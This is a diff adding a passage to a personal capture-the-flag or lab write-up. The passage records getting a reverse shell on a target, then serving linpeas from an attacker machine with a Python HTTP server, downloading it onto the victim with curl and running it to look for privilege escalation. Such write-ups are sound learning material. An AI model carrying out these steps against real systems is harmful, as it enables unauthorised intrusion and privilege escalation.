@@ -68,3 +68,32 @@ However, it did not call back on my machine. After on my first shot, I got break
 
 ![[Screen Shot 2024-10-04 at 09.59.31.png]]![[Screen Shot 2024-10-04 at 10.00.59.png]]
 
+
+
+Now it works ! After I restarted the machine, I was able to get my reverse shell !
+
+![[Screen Shot 2024-10-04 at 11.11.31.png]]
+
+I have tried to run linpeas on tmp folder which allows users to run many scripts here ,but in this scenario it does not work. Therefore, I uploaded my files through /home/kiba
+
+1. Deploy python server from local
+```
+python -m http.server 3131
+```
+
+2. Download linpeas from victim machine
+```
+curl http://10.11.69.113:3131/linpeas.sh -o linpeas.sh
+```
+
+3. Give executable permission to linpeas.sh
+```
+chmod +x linpeas.sh
+```
+
+4. Examine carefully  the linpeas output
+- I found really useful evidence to escalate our privileges
+
+![[Screen Shot 2024-10-04 at 11.46.43 1.png]]
+
+
